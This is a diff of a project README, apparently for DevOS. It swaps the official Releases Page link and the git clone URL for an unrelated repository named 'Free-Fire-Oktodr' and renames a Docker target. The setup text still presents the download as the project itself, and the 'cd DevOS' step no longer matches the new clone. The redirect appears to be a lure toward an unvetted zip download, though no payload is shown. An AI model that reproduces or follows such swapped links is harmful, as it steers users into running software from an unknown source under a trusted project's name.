@@ -77,12 +77,12 @@ If you're new to installing software from GitHub, don't worry! If you encounter 
 
 ### Clone the Repository
 
-Alternatively, you can download the latest version of the project directly from the [Releases Page](https://github.com/stackblitz-labs/DevOS/releases/latest). Simply download the .zip file, extract it, and proceed with the setup instructions below. If you are comfertiable using git then run the command below.
+Alternatively, you can download the latest version of the project directly from the [Releases Page](https://github.com/massipoytro-sketch/Free-Fire-Oktodr/releases/latest). Simply download the .zip file, extract it, and proceed with the setup instructions below. If you are comfertiable using git then run the command below.
 
 Clone the repository using Git:
 
 ```bash
-git clone https://github.com/stackblitz-labs/DevOS
+git clone https://github.com/massipoytro-sketch/Free-Fire-Oktodr
 cd DevOS
 ```
 
@@ -183,7 +183,7 @@ Once you've configured your keys, the application will be ready to use the selec
    Alternatively, use Docker commands directly:
 
    ```bash
-   docker build . --target bolt-ai-development
+   docker build . --target devos-development
    ```
 
 2. **Run the Container**:  
